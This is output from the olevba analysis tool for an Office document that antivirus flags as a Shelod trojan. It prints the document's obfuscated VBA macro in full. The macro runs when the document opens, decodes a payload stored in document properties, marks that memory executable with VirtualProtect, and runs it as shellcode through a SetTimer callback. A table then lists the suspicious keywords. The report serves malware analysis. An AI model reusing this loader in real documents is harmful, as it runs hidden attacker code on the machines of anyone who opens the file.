olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-ff694f47062c949cb0f32eba64c546ab389c5639a2392b05294cb199059e1888
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-ff694f47062c949cb0f32eba64c546ab389c5639a2392b05294cb199059e1888 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function CadmiferousWebbingKirkmen Lib "user32" Alias "KillTimer" (ByVal UnvelvetyEncompasserAllonym As LongPtr, ByVal EnteroparesisParaphragmTunal As LongPtr) As LongPtr
#Else
Private Declare Function StockpotsJellylikenessDermabrasion Lib "user32" Alias "SetTimer" ( ByVal HemelytronCatguts As Long, ByVal ViolatesEnfolding As Long, ByVal BaselessThoracoplastiesGassit As Long, ByVal BaddiePortcullising As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function StockpotsJellylikenessDermabrasion Lib "user32" Alias "SetTimer" (ByVal KatabothraConnoisseur As LongPtr, ByVal SastraHumoredAqueducts As LongPtr, ByVal TwillingIsoamylamine As LongPtr, ByVal PuntilSeroalbuminuria As LongPtr) As LongPtr
Private Declare PtrSafe Function AcatastasiaSquawkieRelucting Lib "kernel32" Alias "VirtualProtect" (ByVal MastheadsBumpee As LongPtr, ByVal UnwreakenGyroscopes As LongPtr, ByVal BulbsBrainlessPhrasemonger As LongPtr, MoonlikeHelotry As LongPtr) As LongPtr
#Else
Private Declare Function AcatastasiaSquawkieRelucting Lib "kernel32" Alias "VirtualProtect"  (ByVal QuealLegiblenessImperialine As Long, ByVal BeapronedUnderbelliesRunningly As Long, ByVal OuttinkleUnbright As Long, AllodiallyNutritory As Long) As Long
Private Declare Function CadmiferousWebbingKirkmen Lib "user32" Alias "KillTimer" ( ByVal PrecatoryUnuniquenessTessitura As Long, ByVal UnalikeLiberalisation As Long) As Long
#End If
Private Sub Document_Open()
Dim BemoanerCariosity() As Byte
#If Win64 Then
BemoanerCariosity = ReeshieCataleptoid(ActiveDocument.BuiltInDocumentProperties(uaoeVU_Qlm("JQcxpU2")).Value)
#Else
BemoanerCariosity = ReeshieCataleptoid(ActiveDocument.BuiltInDocumentProperties(uaoeVU_Qlm("OWmQBZXUDP3x")).Value)
#End If
#If VBA7 Then
Dim RebusUniformist As LongPtr
Dim MelaconiteAnatifaFaultfinding As LongPtr
Dim AdjutageShankar As LongPtr
Dim LasiocampaNonseasonableness As LongPtr
#Else
Dim RebusUniformist As Long
Dim MelaconiteAnatifaFaultfinding As Long
Dim AdjutageShankar As Long
Dim LasiocampaNonseasonableness As Long
#End If
MelaconiteAnatifaFaultfinding = UBound(BemoanerCariosity) + 1
AdjutageShankar = VarPtr(BemoanerCariosity(0))
AcatastasiaSquawkieRelucting AdjutageShankar, MelaconiteAnatifaFaultfinding, 64, VarPtr(RebusUniformist)
GetObject(uaoeVU_Qlm("QIHpJvzQD")).Environment(uaoeVU_Qlm("aaAbCpSkzRZUT"))(uaoeVU_Qlm("SOIM72l2XVck")) = ActiveDocument.FullName
GetObject(uaoeVU_Qlm("ZAa0Ers")).Environment(uaoeVU_Qlm("rObHeFLs28Q"))(uaoeVU_Qlm("cizyYe9b4")) = uaoeVU_Qlm("aLhoouuqMOB")
If True Then
LasiocampaNonseasonableness = StockpotsJellylikenessDermabrasion(0, AdjutageShankar, 1, AdjutageShankar)
TinniestChurchman 1
CadmiferousWebbingKirkmen 0, LasiocampaNonseasonableness
End If
GetObject(uaoeVU_Qlm("DLrlcxNi")).Environment(uaoeVU_Qlm("qmBi8kIdYni")).Remove (uaoeVU_Qlm("zSlagJnL"))
GetObject(uaoeVU_Qlm("cvIQJvN7D")).Environment(uaoeVU_Qlm("CqtCP9eC")).Remove (uaoeVU_Qlm("dxxlZajQ7q"))
ReDim BemoanerCariosity(1)
End Sub
Sub TinniestChurchman(Finish)
Dim TrilaterallyPoloistsBardel As Long
Dim RipstoneConvolutionVisorless As Long
RipstoneConvolutionVisorless = Timer() + (Finish)
Do
TrilaterallyPoloistsBardel = Timer()
DoEvents
Loop Until TrilaterallyPoloistsBardel > RipstoneConvolutionVisorless
End Sub
Public Function uaoeVU_Qlm(strInput)
uaoeVU_Qlm = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function MicrobalForgiveable(CornflagFuelizer, AntimodernDaikonBombards)
MicrobalForgiveable = Mid(CornflagFuelizer, AntimodernDaikonBombards + 1, 1)
End Function
Function CorporalsForhoo(AgaveWaterinessAcatharsia) As Long
If Int(Rnd(23)) > 2 Then
CorporalsForhoo = 9000
Else
CorporalsForhoo = Len(AgaveWaterinessAcatharsia)
End If
End Function
Function ReeshieCataleptoid(IglusBrassylic)
ReDim GonditeEthylation(CorporalsForhoo(IglusBrassylic) - 1) As Byte
Dim ConjectureEctropionize As Long, TedgeOutersSwingable As Long
Dim TranspirabilityUrticastrum: TranspirabilityUrticastrum = uaoeVU_Qlm("bmFySM9uWF") & uaoeVU_Qlm("S0JBOP0tqd")
For ConjectureEctropionize = 0 To CorporalsForhoo(IglusBrassylic) - 1 Step 2
TedgeOutersSwingable = ConjectureEctropionize / 2
GonditeEthylation(TedgeOutersSwingable) = CDec(TranspirabilityUrticastrum & MicrobalForgiveable(IglusBrassylic, ConjectureEctropionize) & MicrobalForgiveable(IglusBrassylic, ConjectureEctropionize + 1))
Next
ReeshieCataleptoid = GonditeEthylation
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

